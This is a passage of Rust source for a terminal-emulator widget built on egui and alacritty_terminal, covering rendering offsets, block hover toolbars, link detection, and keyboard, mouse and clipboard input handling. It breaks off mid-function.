//! Terminal widget: renders a TermBackend and translates egui input into
//! VT byte sequences. Adapted from egui_term (MIT), rewritten to render from
//! `Term::renderable_content()` (visible cells only — no grid clone per frame)
//! with a per-glyph galley cache and pixel-snapped cell metrics.

use alacritty_terminal::grid::Dimensions;
use alacritty_terminal::index::{Column as GridColumn, Line as GridLine, Point as GridPoint};
use alacritty_terminal::selection::SelectionType;
use alacritty_terminal::term::cell::{Flags, LineLength};
use alacritty_terminal::term::search::{Match, RegexIter, RegexSearch};
use alacritty_terminal::term::TermMode;
use alacritty_terminal::vte::ansi::{Color, CursorShape, NamedColor};
use egui::epaint::RectShape;
use egui::{
    Color32, CornerRadius, FontId, Key, MouseWheelUnit, PointerButton, Pos2, Rect, Response, Sense,
    Shape, Stroke, StrokeKind, Ui, Vec2,
};

use super::glyph_cache::{GlyphCache, GlyphKey};
use super::bindings::{BindingAction, BindingsLayout, InputKind};
use super::term_backend::{MouseButton, TermBackend};
use crate::state::BlockRec;

/// The Ctrl+hover / Ctrl+click URL pattern (alacritty's hint regex shape).
/// Lives here so the unit tests exercise the EXACT production pattern.
pub(crate) const URL_REGEX: &str =
    r#"(https://|http://|file://|mailto:|git://|ssh:|ftp://)[^\u{0000}-\u{001F}\u{007F}-\u{009F}<>"\s{-}\^⟨⟩`]+"#;

/// Padding between the terminal card edge and the character grid (T8 / D31).
/// The right side is tighter so the floating scrollbar sits in it.
pub const PAD_L: f32 = 12.0;
pub const PAD_T: f32 = 12.0;
pub const PAD_R: f32 = 8.0;
pub const PAD_B: f32 = 12.0;

/// Usable grid size for a given outer widget size (drives cols/rows math).
pub fn grid_inner_size(outer: Vec2) -> Vec2 {
    Vec2::new(
        (outer.x - PAD_L - PAD_R).max(0.0),
        (outer.y - PAD_T - PAD_B).max(0.0),
    )
}

fn grid_inner_rect(outer: Rect) -> Rect {
    Rect::from_min_max(
        Pos2::new(outer.min.x + PAD_L, outer.min.y + PAD_T),
        Pos2::new(outer.max.x - PAD_R, outer.max.y - PAD_B),
    )
}

/// Vertical shift of the character grid inside the padded grid rect.
///
/// The committed grid height can disagree with the live card height: by the
/// sub-cell remainder in steady state, by whole rows while a drag-resize
/// waits on the throttled PTY commit. Rendering top-anchored turns that
/// difference into a dead band under the prompt that snaps shut on commit.
/// Instead, pre-apply the shift alacritty's resize will make, so the commit
/// lands with no visible movement:
///  • taller viewport: `grow_lines` pulls rows from scrollback — a full
///    screen stays flush with the bottom edge; whatever scrollback can't
///    fill renders as background ABOVE the content (never a dead band
///    between the content and the strip — the restore-void fix);
///  • shorter viewport: `shrink_lines` clips blank rows under the cursor
///    first, then scrolls up only enough to keep the cursor on screen.
///
/// ONE formula for both signs (the restore-void fix made this uniform):
/// pin the last meaningful row — the grid bottom minus the dead tail of
/// blank rows below the cursor (plus the covered prompt row and its
/// pre-prompt blanks) — to the viewport's bottom edge. Positive shift =
/// content shorter than the viewport, pinned down with scrollback (or
/// plain background) above; negative = content taller, scrolled up just
/// enough to keep the cursor visible. Both match what the next resize
/// commit produces, so the commit lands with no visible movement.
fn content_y_offset(backend: &TermBackend, avail_h: f32, cover_line: Option<i32>) -> f32 {
    let cell_h = backend.size.cell_height.max(1.0);
    let grid = backend.term.grid();
    let slack = avail_h - backend.size.rows as f32 * cell_h;
    // Alt-screen apps (claude, vim) own their absolute layout — never shift
    // a TUI frame, whatever its blank shape (only keep the cursor visible
    // while a shrink commit is pending). This gate used to be an ACCIDENT
    // of the old history cap below (the alt grid has no scrollback, so
    // `min(history_px)` zeroed the shift); the cap is gone, so the gate
    // must be explicit.
    if backend.mode().contains(TermMode::ALT_SCREEN) {
        let cursor_bottom = (grid.cursor.point.line.0 + 1) as f32 * cell_h;
        return (avail_h - cursor_bottom).min(0.0);
    }
    // Continuity fill: consecutive blank live rows below the cursor are dead
    // space — a fresh post-restore screen is one prompt line and ~40 of them.
    // Shift the content down over that emptiness and let scrollback show
    // above (drawn by render's history pass), so a reopen reads like the
    // session never went away: old output filling the card, prompt at the
    // bottom. Purely presentational; grid state and VT coordinates untouched,
    // and the shift melts away as real output fills the rows.
    let rows = backend.size.rows as i32;
    let cur = grid.cursor.point.line.0;
    let mut blank_tail = 0i32;
    let mut reached_cursor = true;
    for line in ((cur + 1).max(0)..rows).rev() {
        if grid[GridLine(line)].line_length().0 == 0 {
            blank_tail += 1;
        } else {
            reached_cursor = false;
            break;
        }
    }
    // Static-input extension (INV-PIN acceptance): when the current-prompt
    // cover blanks the cursor row, that row AND the shell's own pre-prompt
    // blank rows above it (Format-Table's trailing blank + PS 5.1's blank
    // before the prompt) are visually dead too — the last VISIBLE row of
    // output pins flush above the strip instead of floating over a 3-6 row
    // void. Gated on the cover being GRANTED this frame (drop-don't-drift:
    // a raw prompt renders with the honest gap) and on everything below the
    // cursor being blank (content below the prompt is real and stays put).
    //
    // Spacer covers (empty-Enter rows) deliberately do NOT count as blank
    // here (supersedes the original static-input rule): they are the
    // spacing the user just ASKED for — retiring them into the fill made
    // every empty Enter a visual no-op (the "can't do blank enter for line
    // spacing" field regression). The walk stops at the first spacer row,
    // so each empty Enter leaves one visible blank-covered row above the
    // lane, exactly like a newline in a plain terminal.
    if reached_cursor && cover_line == Some(cur) && cur >= 0 {
        blank_tail += 1; // the blanked prompt row itself
        for line in (0..cur).rev() {
            if grid[GridLine(line)].line_length().0 == 0 {
                blank_tail += 1;
            } else {
                break;
            }
        }
    }
    // UNCAPPED (the restore-void fix): the fill used to clamp at
    // `history_size * cell_h` — "shift only what scrollback can supply".
    // That top-anchored every short-history terminal, and the composer's
    // current-prompt cover still blanked the prompt row, so a restored
    // session rendered as banner at the TOP, a screen-sized void, and the
    // strip at the bottom (the field screenshots: PS "Shell · alice 2" and
    // the ssh terminal that looked completely empty). Restores hit this
    // hardest BECAUSE the seam dedupe works: it eats the stacked duplicate
    // banners/prompts and leaves almost no history to "supply" the fill.
    // The cap protected nothing: the history paint pass stops at the top of
    // scrollback and leaves background above (term_view render), selection
    // mapping clamps at -history (selection_point), and the resize no-jump
    // invariant holds uncapped (the assert_no_jump suite). Content pins to
    // the bottom edge — "everything pins to bottom", one anchor mode —
    // and any leftover space renders ABOVE the content, never between the
    // content and the composer strip.
    //
    // `slack + blank_tail` IS the unified pin: avail − (rows − dead)·cell_h,
    // for both signs (a pending shrink commit lands with the same shape).
    // The max() keeps the cursor from leaving the viewport TOP in the one
    // shape where pinning would push it out — a high cursor with a
    // taller-than-viewport run of real content below it (mid shrink-drag).
    (slack + blank_tail as f32 * cell_h).max(-(cur.max(0) as f32) * cell_h)
}

// NOTE (design revision, user-mandated): every terminal — hooked or not —
// renders BOTTOM-PINNED via the continuity fill above, one consistent anchor
// mode. An earlier pass suppressed the fill for composer-driven terminals to
// kill "upward flicker on submit", but that top-anchored the boot view (prompt
// at the top, void below, history hidden above — rejected: "i want everything
// to pin to bottom"). The flicker was never the pin — it was the EASED fill
// retirement animating content while output landed; the fill now snaps
// frame-synchronized with the content change (see `show`), so rows march up
// rigidly like normal terminal scrolling.

const SEL_OVERLAY: Color32 = Color32::from_rgba_premultiplied(31, 33, 64, 64);
const SURFACE_2: Color32 = Color32::from_rgb(0x1B, 0x1F, 0x2A);
const TEXT_SECONDARY: Color32 = Color32::from_rgb(0xA9, 0xAF, 0xC0);
// Search highlights (V4): all matches faint, the current match stronger.
const SEARCH_HL: Color32 = Color32::from_rgba_premultiplied(50, 53, 103, 90);
const SEARCH_CURRENT: Color32 = Color32::from_rgba_premultiplied(96, 101, 197, 170);

// Block chrome (P2, restyled for the seamless doctrine): NO lines at rest —
// success is completely quiet (the absence of red IS the success state) and
// a block's bounds appear only as a faint hover tint behind its rows.
const DANGER: Color32 = Color32::from_rgb(0xFF, 0x5C, 0x6C);
// Premultiplied consts (from_rgba_unmultiplied is not a const fn):
// white @ a=7, DANGER (0xFF,0x5C,0x6C) @ a=140 / a=26.
const HOVER_TINT: Color32 = Color32::from_rgba_premultiplied(7, 7, 7, 7);
const DANGER_GUTTER: Color32 = Color32::from_rgba_premultiplied(140, 51, 59, 140);
const CHIP_BG: Color32 = Color32::from_rgba_premultiplied(26, 9, 11, 26);
const TEXT_FAINT: Color32 = Color32::from_rgb(0x4A, 0x4F, 0x60);
const TEXT: Color32 = Color32::from_rgb(0xE7, 0xE9, 0xEF);
const TEXT_MUTED: Color32 = Color32::from_rgb(0x6B, 0x71, 0x85);
const ACCENT: Color32 = Color32::from_rgb(0x7C, 0x83, 0xFF);
const SURFACE_3: Color32 = Color32::from_rgb(0x22, 0x26, 0x34);
const OV_HOVER: Color32 = Color32::from_rgba_premultiplied(10, 10, 10, 10);
const ACCENT_SUBTLE: Color32 = Color32::from_rgba_premultiplied(15, 15, 30, 30);

/// Everything the widget needs to draw + interact with blocks (P2).
/// None ⇒ zero block work anywhere in the widget.
pub struct BlockViewCtx<'a> {
    /// Sorted by start_off (the App store keeps it that way).
    pub recs: &'a [BlockRec],
    /// App-evaluated Re-run gate (running + no open block + not alt-screen).
    pub can_rerun: bool,
}

/// Block actions the App must execute (they need IPC / store access).
/// CopyCmd + Jump are handled entirely in-widget.
pub enum BlockAction {
    CopyOutput(u64),
    Rerun(u64),
}

#[derive(Clone, Copy, PartialEq)]
enum BlockBtn {
    CopyCmd,
    CopyOutput,
    Rerun,
    Jump,
}

/// Hover toolbar layout for the block under the pointer — manual painter
/// chrome + manual hit-testing, exactly like the jump pill (real egui Buttons
/// would steal the grid's keyboard focus for a frame per click, and
/// process_input consumes RAW events so widget hit-order can't protect
/// selection anyway).
struct HoveredBlock {
    start_off: u64,
    /// Anchor line (grid space) — the Jump target.
    line: i32,
    /// Exclusive end bound (grid space) — the hover-reveal tint's extent.
    end_bound: i32,
    toolbar: Rect,
    btns: [(Rect, BlockBtn); 4],
    rerun_enabled: bool,
    caption: String,
}

#[derive(Clone, Default)]
struct ViewState {
    dragging: bool,
    scroll_accum: f32,
    mouse_grid: GridPoint,
    /// Cache of the ctrl-hover URL match, keyed by (cell, display_offset) so we
    /// don't rerun the regex every frame while the mouse is still.
    link_key: Option<(GridPoint, usize)>,
    link_match: Option<Match>,
    /// A primary press began inside the block toolbar (P2): the release is a
    /// toolbar click, and selection/mouse-report never see either event.
    toolbar_press: Option<Pos2>,
    /// A scrollbar-thumb drag is live: pointer-y offset from the thumb's top
    /// at grab time (UX MEDIUM-7). Consumes pointer events like toolbar_press
    /// so a thumb drag never starts a selection.
    scrollbar_drag: Option<f32>,
    /// A primary press began inside the jump-to-bottom pill: the release is
    /// the jump click, and selection/mouse-report never see either event
    /// (LOW-10 — the pill used to let the press fall through and clear the
    /// selection).
    pill_press: bool,
    /// A Ctrl+press landed on a resolved link (QOL §6.5): press AND release
    /// are consumed for the link open — mouse-report forwarding and the
    /// selection machine never see either event (an app must never receive
    /// the release of a press it never got).
    link_press: bool,
    /// A plain (unshifted) primary press over a MOUSE_MODE app (the
    /// mouse-first copy fix): the press is NOT forwarded at press time — a
    /// drag becomes a LOCAL selection, and only a zero-travel click delivers
    /// the press+release pair to the app, together, at release time. Holds
    /// the press cell for that deferred report.
    deferred_click: Option<GridPoint>,
    /// The Secondary press's forwarding verdict, latched at press so the
    /// release always matches it (an app must never see a release for a
    /// press it never got, nor lose the release of one it did get when a
    /// selection appears/dies in between).
    rclick_forward: bool,
    /// Dwell-tooltip state for the toolbar buttons: (button index, hover t0).
    tip: Option<(u8, f64)>,
    /// The jump-flash instant last animated, so a new jump snaps alpha to 1.
    flash_seen: Option<std::time::Instant>,
}

/// What the widget wants the app to do after this frame.
#[derive(Default)]
pub struct TermViewOutput {
    /// Bytes to ship to the daemon as terminal input.
    pub write: Vec<u8>,
    /// A block action that needs App-level access (IPC / rerun gate).
    pub block: Option<BlockAction>,
    /// The screen rect of the composer-covered prompt row (P3): the caller
    /// asked for `cover_line` and the row was at rest and on-screen, so the
    /// theme background was painted over it (shell prompt + hollow cursor
    /// hidden) and the composer may draw its own prompt there. None ⇒ no
    /// cover this frame — everything rendered exactly as the raw terminal.
    pub cover: Option<Rect>,
    /// QOL §3.4: a right-click was forwarded to a MOUSE_MODE app this frame —
    /// the caller must NOT open the context menu for it ("menu wins unless
    /// the app captures"; Shift overrides the capture).
    pub rclick_forwarded: bool,
    /// QOL §6.1: middle-click released over the grid outside MOUSE_MODE —
    /// the caller pastes the clipboard through the mode router.
    pub middle_paste: bool,
    /// QOL §5: a raw-grid paste tripped the safety gate (non-bracketed +
    /// multi-line/huge) — nothing was written; the caller shows the
    /// ConfirmPaste modal with this text.
    pub paste_pending: Option<String>,
}

/// Persistent scratch shape buffers for `render`: one set shared across all
/// terminals, owned by App next to the GlyphCache. On a large grid the text
/// bucket alone holds thousands of shapes — regrowing seven Vecs from empty
/// every streaming frame was repeated realloc+memmove. Each render drains
/// every bucket into the painter (compose-pass order preserved), so the
/// buffers are always empty between frames, only the capacity persists.
#[derive(Default)]
pub struct RenderScratch {
    bg: Vec<Shape>,
    sel: Vec<Shape>,
    search: Vec<Shape>,
    deco: Vec<Shape>,
    cursor: Vec<Shape>,
    text: Vec<Shape>,
    chips: Vec<Shape>,
}

/// Per-frame view options (QOL): the small prefs/presentation bundle so the
/// `show` parameter list stops creeping.
#[derive(Default)]
pub struct ViewOpts {
    /// §6.2: copy the selection at every selection-commit edge.
    pub copy_on_select: bool,
    /// §5: the paste-safety gate is armed (Prefs.paste_warn).
    pub paste_warn: bool,
    /// §4.7: an OS drag hovers the window (or an ssh refusal lingers) —
    /// paint the accent wash + this centered label over the grid.
    pub drop_label: Option<String>,
}

#[allow(clippy::too_many_arguments)]
pub fn show(
    ui: &mut Ui,
    backend: &mut TermBackend,
    bindings: &BindingsLayout,
    font: FontId,
    focused: bool,
    url_regex: &mut RegexSearch,
    glyphs: &mut GlyphCache,
    scratch: &mut RenderScratch,
    ppp: f32,
    search_regex: Option<&mut RegexSearch>,
    current_match: Option<Match>,
    blocks: Option<BlockViewCtx<'_>>,
    cover_line: Option<i32>,
    opts: ViewOpts,
) -> (Response, TermViewOutput) {
    let mut out = TermViewOutput::default();

    let size = ui.available_size();
    let (response, painter) = ui.allocate_painter(size, Sense::click_and_drag());
    let grid_rect = grid_inner_rect(response.rect);
    let widget_id = response.id;
    // Where the character grid actually sits inside the padded rect: shifted
    // so the throttled resize commit lands with no visible movement (see
    // content_y_offset). Mouse→cell mapping and glyph placement must agree,
    // so both use this rect; card chrome (scrollbar, jump pill) stays on
    // grid_rect. The shift is NEVER animated: when k output rows land in a
    // frame, the fill retires by exactly k rows in that same frame, so the
    // motion IS the content motion — rows march up rigidly like normal
    // terminal scrolling. Any easing here detaches the prompt row (and the
    // composer cover riding it) from the grid for the ease duration — the
    // user-confirmed "falling motion is slow" / "upward flicker" bugs.
    let raw_shift = content_y_offset(backend, grid_rect.height(), cover_line);
    // The shift changed this frame: the cursor must SNAP to its
    // content-relative row this frame too (its own 0.07s lerp would lag the
    // instant content move and strand it in the void, R2).
    let prev_raw: Option<f32> = ui.memory(|m| m.data.get_temp(widget_id.with("cont_raw")));
    let shift_moving = prev_raw.is_some_and(|p| (raw_shift - p).abs() > 0.5);
    ui.memory_mut(|m| m.data.insert_temp(widget_id.with("cont_raw"), raw_shift));
    let shift = raw_shift;
    let content_rect = grid_rect.translate(Vec2::new(0.0, shift));
    let mut vs = ui.memory(|m| {
        m.data
            .get_temp::<ViewState>(widget_id)
            .unwrap_or_default()
    });

    if focused {
        response.request_focus();
    }
    // While the grid has focus, Tab must reach the shell (not cycle egui
    // widget focus), arrows must not walk widgets, and Escape must not
    // surrender focus — each of those otherwise costs a keystroke and a
    // frame of lost typing.
    ui.memory_mut(|m| {
        m.set_focus_lock_filter(
            widget_id,
            egui::EventFilter {
                tab: true,
                horizontal_arrows: true,
                vertical_arrows: true,
                escape: true,
            },
        );
    });

    // Jump-to-bottom pill clicks are handled in process_input (press-consumed
    // like the block toolbar, so they can't clear a selection — LOW-10).
    let display_offset = backend.term.grid().display_offset();

    // ── Journal-block chrome gate (P2). ONE boolean guarantees hookless
    // sessions (blocks=None), alt-screen, stale tracking, and Claude/cmd
    // sessions all take exactly the pre-P2 render path.
    let blocks_active = blocks.is_some()
        && !backend.mode().contains(TermMode::ALT_SCREEN)
        && backend
            .block_feed
            .as_ref()
            .is_some_and(|f| !f.stale && !f.anchors.is_empty());
    let bctx = if blocks_active { blocks.as_ref() } else { None };
    // Layout BEFORE process_input (which may consume the press), render after.
    let chrome = bctx.and_then(|b| {
        hovered_block_layout(
            &painter,
            backend,
            b,
            grid_rect,
            content_rect,
            ui.ctx().pointer_latest_pos(),
            vs.dragging,
        )
    });

    process_input(
        &response,
        backend,
        bindings,
        &mut vs,
        &mut out,
        content_rect,
        grid_rect,
        url_regex,
        chrome.as_ref(),
        bctx,
        &opts,
        cover_line,
    );

    // Lost-release safety (restored-render fix): a drag whose release never
    // reached us (Alt+Tab / focus loss mid-drag — egui sends no
    // PointerButton-up afterwards) left `vs.dragging` latched TRUE, and
    // every subsequent buttonless hover kept EXTENDING the selection — huge
    // "navy slab" selections the user never made, immortal on idle restored
    // sessions (no output ever clears them). Same class for a stranded
    // scrollbar drag / pill press. The release handlers above already ran,
    // so when the primary button is up here these flags can only be stale.
    if !ui.input(|i| i.pointer.primary_down()) {
        vs.dragging = false;
        vs.scrollbar_drag = None;
        vs.pill_press = false;
        vs.link_press = false;
        vs.deferred_click = None;
    }
    // Same class for a stranded right-click-forward latch (release lost to
    // focus loss / pointer leaving the grid mid-press): the app already
    // missed the release — never let the latch leak onto a future press.
    if !ui.input(|i| i.pointer.button_down(PointerButton::Secondary)) {
        vs.rclick_forward = false;
    }

    // Resolve the ctrl-hover link once per (cell, offset), reusing app regex.
    // Covered rows are SUPPRESSED (QOL §6.5): the hit-test reads GRID text
    // while the row paints synthesized `❯ cwd cmd` — a column-mismatched
    // underline/click there is a wrong-cover-class bug (refuse over guess;
    // the raw view stays reachable — covers drop under selection).
    let ctrl_held = ui.input(|i| i.modifiers.command_only());
    let hovered_link = if ctrl_held && ui.rect_contains_pointer(grid_rect) {
        let key = (vs.mouse_grid, display_offset);
        if vs.link_key != Some(key) {
            vs.link_key = Some(key);
            vs.link_match = regex_match_at(backend, vs.mouse_grid, url_regex);
        }
        vs.link_match
            .clone()
            .filter(|m| !link_covered(backend, m, cover_line))
    } else {
        vs.link_key = None;
        vs.link_match = None;
        None
    };
    // The one unlinked-looking affordance used to be the underline alone —
    // the pointer now says "clickable" too (QOL §6.5).
    if hovered_link.is_some() {
        ui.ctx().set_cursor_icon(egui::CursorIcon::PointingHand);
    }

    // Visible search matches to highlight (V4). Collected before the render
    // borrow of `backend` begins.
    let search_matches: Vec<Match> = match search_regex {
        Some(re) => visible_regex_match_iter(backend, re).collect(),
        None => Vec::new(),
    };

    out.cover = render(
        &painter,
        content_rect,
        grid_rect,
        backend,
        font,
        hovered_link,
        glyphs,
        scratch,
        ppp,
        focused,
        widget_id,
        &search_matches,
        current_match,
        bctx,
        chrome.as_ref(),
        &mut vs,
        cover_line,
        shift_moving,
    );

    // ── Drop-target wash (QOL §4.7): a whole-surface accent tint + one
    // centered text line while an OS drag hovers (or an ssh refusal
    // lingers). Painted OVER everything — it is the top wash; no strokes,
    // no panel, no icon (doctrine). The label doubles as the preview and
    // the refusal surface.
    if let Some(label) = &opts.drop_label {
        let p = painter.with_clip_rect(grid_rect);
        p.rect_filled(grid_rect, CornerRadius::ZERO, ACCENT.gamma_multiply(0.06));
        let g = p.layout_no_wrap(label.clone(), FontId::proportional(13.0), TEXT_MUTED);
        p.galley(
            Pos2::new(
                grid_rect.center().x - g.size().x / 2.0,
                grid_rect.center().y - g.size().y / 2.0,
            ),
            g,
            TEXT_MUTED,
        );
    }

    ui.memory_mut(|m| m.data.insert_temp(widget_id, vs));
    (response, out)
}

/// QOL §6.5: any row of a link match painted as a cover this frame (the
/// armed/hold prompt cover or a healthy presentational cover) suppresses the
/// link — grid columns mean nothing against synthesized galleys.
fn link_covered(backend: &TermBackend, m: &Match, cover_line: Option<i32>) -> bool {
    let (lo, hi) = (m.start().line.0, m.end().line.0);
    if cover_line.is_some_and(|l| l >= lo && l <= hi) {
        return true;
    }
    !backend.healthy_covers_in(lo, hi).is_empty()
}

/// Format a block duration (§11.6): "412 ms", "3.4 s", "2m 05s".
pub fn fmt_duration(ms: u64) -> String {
    if ms < 1000 {
        format!("{ms} ms")
    } else if ms < 60_000 {
        format!("{:.1} s", ms as f64 / 1000.0)
    } else {
        format!("{}m {:02}s", ms / 60_000, (ms % 60_000) / 1000)
    }
}

/// Pure layout for the hover toolbar: pointer row (via `selection_point` —
/// the SAME mapping drag-select uses, including negative-y history rows) →
/// binary search for the block whose [line, end_bound) contains it → pill
/// geometry. None unless the pointer is inside the grid, no drag is running,
/// no mouse-mode app is consuming the mouse, and the block is COMPLETED (an
/// open block may be a live TUI — nothing may draw over it).
#[allow(clippy::too_many_arguments)]
fn hovered_block_layout(
    painter: &egui::Painter,
    backend: &TermBackend,
    blocks: &BlockViewCtx<'_>,
    grid_rect: Rect,
    content_rect: Rect,
    pointer: Option<Pos2>,
    dragging: bool,
) -> Option<HoveredBlock> {
    if dragging || backend.mode().intersects(TermMode::MOUSE_MODE) {
        return None;
    }
    let pos = pointer?;
    if !grid_rect.contains(pos) {
        return None;
    }
    let feed = backend.block_feed.as_ref()?;
    let rel = pos - content_rect.min;
    let row = backend.selection_point(rel.x, rel.y).line.0;
    let idx = feed.anchors.partition_point(|a| a.line <= row).checked_sub(1)?;
    let a = feed.anchors[idx];
    let end_bound = a
        .end_line
        .or_else(|| feed.anchors.get(idx + 1).map(|n| n.line))
        .unwrap_or(backend.term.grid().cursor.point.line.0 + 1);
    if row >= end_bound && row != a.line {
        return None;
    }
    let ri = blocks
        .recs
        .binary_search_by_key(&a.start_off, |r| r.start_off)
        .ok()?;
    let rec = &blocks.recs[ri];
    rec.end_off?; // open block: actions live in the panel only

    // Geometry: right-aligned pill riding just under the block's separator,
    // docking to the viewport top while the pointer is inside a long block
    // scrolled past its header (Warp's sticky-header affordance).
    let display_offset = backend.term.grid().display_offset() as i32;
    let cell_h = backend.size.cell_height;
    let sep_y = content_rect.min.y + cell_h * (a.line + display_offset) as f32;
    let h = 24.0;
    let y = (sep_y + 4.0).max(grid_rect.min.y + 4.0);

    let dur = fmt_duration(
        rec.ended_ms
            .unwrap_or(rec.started_ms)
            .saturating_sub(rec.started_ms),
    );
    let caption = match rec.cwd.as_ref() {
        Some(p) => format!(
            "{dur} · {}",
            super::middle_ellipsize(&p.to_string_lossy(), 28)
        ),
        None => dur,
    };
    let cap_w = painter
        .layout_no_wrap(caption.clone(), FontId::proportional(11.0), TEXT_SECONDARY)
        .size()
        .x;
    const BTN: f32 = 18.0;
    const GAP: f32 = 4.0;
    let w = 10.0 + cap_w + 8.0 + 4.0 * BTN + 3.0 * GAP + 8.0;
    let right = grid_rect.max.x - 12.0;
    let toolbar = Rect::from_min_max(Pos2::new(right - w, y), Pos2::new(right, y + h));
    let kinds = [
        BlockBtn::CopyCmd,
        BlockBtn::CopyOutput,
        BlockBtn::Rerun,
        BlockBtn::Jump,
    ];
    let mut btns = [(Rect::NOTHING, BlockBtn::CopyCmd); 4];
    for (i, k) in kinds.into_iter().enumerate() {
        let x = toolbar.max.x - 8.0 - (4 - i) as f32 * BTN - (3 - i) as f32 * GAP;
        let r = Rect::from_min_size(
            Pos2::new(x, toolbar.center().y - BTN / 2.0),
            Vec2::splat(BTN),
        );
        btns[i] = (r, k);
    }
    Some(HoveredBlock {
        start_off: a.start_off,
        line: a.line,
        end_bound,
        toolbar,
        btns,
        rerun_enabled: blocks.can_rerun,
        caption,
    })
}

#[allow(clippy::too_many_arguments)]
fn process_input(
    response: &Response,
    backend: &mut TermBackend,
    bindings: &BindingsLayout,
    vs: &mut ViewState,
    out: &mut TermViewOutput,
    content_rect: Rect,
    grid_rect: Rect,
    url_regex: &mut RegexSearch,
    chrome: Option<&HoveredBlock>,
    blocks: Option<&BlockViewCtx<'_>>,
    opts: &ViewOpts,
    cover_line: Option<i32>,
) {
    let ctx = &response.ctx;
    let hovered = response.hovered();
    let has_focus = response.has_focus();
    if !has_focus && !hovered {
        return;
    }

    let modifiers = ctx.input(|i| i.modifiers);
    let events = ctx.input(|i| i.events.clone());
    let mode = backend.mode();

    for event in events {
        match event {
            // ── keyboard ────────────────────────────────────────────────
            // Pure-Alt text duplicates the Key-event chord: egui suppresses
            // text under Ctrl but not Alt, and the Key path already encodes
            // Alt combos (ESC prefix / win32 record). Ctrl+Alt text must
            // pass through untouched — Windows reports AltGr as Ctrl+Alt, so
            // dropping it would swallow AltGr characters on non-US layouts.
            egui::Event::Text(text)
                if has_focus && !(modifiers.alt && !(modifiers.ctrl || modifiers.command)) =>
            {
                // Skip text that a key binding already handled.
                let handled_by_binding = Key::from_name(&text).is_some_and(|key| {
                    bindings.get_action(InputKind::KeyCode(key), modifiers, mode)
                        != BindingAction::Ignore
                });
                if !handled_by_binding {
                    write_and_pin(backend, out, text.as_bytes());
                }
            }
            egui::Event::Key {
                key,
                pressed: true,
                ..
            } if has_focus => {
                // Shift+PageUp/Down page the local viewport (xterm/alacritty
                // convention); full-screen apps get the sequence instead.
                if modifiers.shift_only()
                    && matches!(key, Key::PageUp | Key::PageDown)
                    && !mode.contains(TermMode::ALT_SCREEN)
                {
                    let rows = backend.size.rows as i32;
                    backend.scroll(if key == Key::PageUp { rows } else { -rows }, &mut out.write);
                    continue;
                }
                if backend.win32_input {
                    // conhost negotiated win32-input-mode: ship the real key
                    // event (down+up) — every chord lands exactly as it
                    // would from Windows Terminal. Unchorded printables stay
                    // with their Text events (encode_key returns None).
                    if let Some(seq) = crate::win32_input::encode_key(key, modifiers) {
                        write_and_pin(backend, out, &seq);
                    }
                    continue;
                }
                match bindings.get_action(InputKind::KeyCode(key), modifiers, mode) {
                    BindingAction::Char(c) => {
                        let mut buf = [0u8; 4];
                        write_and_pin(backend, out, c.encode_utf8(&mut buf).as_bytes());
                    }
                    BindingAction::Esc(seq) => {
                        write_and_pin(backend, out, seq.as_bytes());
                    }
                    BindingAction::Copy => copy_selection(ctx, backend),
                    BindingAction::Ignore => {
                        if let Some(seq) = super::bindings::vt_fallback(key, modifiers) {
                            write_and_pin(backend, out, &seq);
                        }
                    }
                    _ => {}
                }
            }
            // R4-F2, all three synthesized-clipboard arms: egui-winit builds
            // Copy/Cut/Paste from the Ctrl+C/X/V chord WITHOUT excluding
            // Alt, and swallows the KeyEvent's composed text. Windows
            // reports AltGr as Ctrl+Alt, so on layouts where AltGr+C/X/V
            // types a character (Polish ć = AltGr+C, Hungarian @ = AltGr+V)
            // the synthesized event would send a spurious interrupt / CAN /
            // clipboard paste. Drop it instead — never harm the session.
            // (The composed character was consumed upstream; recovering it
            // needs a ToUnicode layout query — a possible follow-up.) Plain
            // Ctrl+C/X/V and the Shift/Insert/Delete synthesis carry no Alt
            // and are unaffected.
            egui::Event::Copy if has_focus => {
                if altgr_synthesized(modifiers) {
                    // AltGr+C — not a copy chord; above all, never interrupt.
                } else if ctrl_c_is_copy(backend) {
                    // Plain Ctrl+C with a live selection copies it…
                    copy_selection(ctx, backend);
                } else {
                    // …and interrupts otherwise (as the real key event when
                    // win32-input-mode is on — Windows Terminal's path).
                    interrupt_chord(backend, out, Key::C, 0x03);
                }
            }
            egui::Event::Paste(text) if has_focus => {
                if !altgr_synthesized(modifiers) {
                    paste(backend, out, &text, opts.paste_warn);
                }
            }
            egui::Event::Cut if has_focus => {
                // Ctrl+X (and Shift+Delete, which egui folds into Cut).
                if !altgr_synthesized(modifiers) {
                    interrupt_chord(backend, out, Key::X, 0x18);
                }
            }
            egui::Event::Ime(egui::ImeEvent::Commit(text)) if has_focus => {
                write_and_pin(backend, out, text.as_bytes());
            }

            // ── mouse ───────────────────────────────────────────────────
            egui::Event::MouseWheel {
                unit,
                delta,
                modifiers: wheel_mods,
                ..
            } if hovered => {
                // QOL §6.3: Ctrl+wheel is the font-zoom gesture (mod.rs) —
                // without this guard the same event ALSO scrolled the grid
                // (or shipped arrow keys under ALTERNATE_SCROLL+alt-screen).
                // The event carries its own modifiers — never re-read ctx
                // state for it.
                if wheel_wants_zoom(wheel_mods.command) {
                    continue;
                }
                let lines = match unit {
                    MouseWheelUnit::Line => delta.y,
                    MouseWheelUnit::Point => {
                        vs.scroll_accum += delta.y;
                        let cell_h = backend.size.cell_height.max(1.0);
                        let l = (vs.scroll_accum / cell_h).trunc();
                        vs.scroll_accum -= l * cell_h;
                        l
                    }
                    MouseWheelUnit::Page => delta.y * backend.size.rows as f32,
                };
                if lines != 0.0 {
                    backend.scroll(lines as i32, &mut out.write);
                }
            }
            egui::Event::PointerButton {
                button: PointerButton::Primary,
                pressed,
                pos,
                modifiers: click_mods,
                ..
            } if hovered
                || vs.dragging
                || vs.scrollbar_drag.is_some()
                || vs.pill_press =>
            {
                // Block-toolbar clicks (P2): a press that BEGINS inside the
                // pill is consumed — it must never start a selection (chrome
                // is already suppressed under MOUSE_MODE, so mouse-report
                // can't fire here). A drag that merely enters the pill keeps
                // selecting: only the press decides.
                if pressed {
                    if chrome.is_some_and(|c| c.toolbar.contains(pos)) {
                        vs.toolbar_press = Some(pos);
                        continue;
                    }
                    // Scrollbar lane (UX MEDIUM-7): a press on the thumb
                    // starts a drag-to-scroll; a press in the lane off-thumb
                    // jumps the thumb there and keeps dragging. Consumed like
                    // toolbar presses — never a selection, never a mouse
                    // report. Local-scrollback navigation only (alt-screen
                    // apps own their own scrolling).
                    if !mode.contains(TermMode::ALT_SCREEN) && in_scrollbar_lane(grid_rect, pos) {
                        if let Some(geom) = ScrollbarGeom::compute(backend, grid_rect) {
                            let off = backend.term.grid().display_offset();
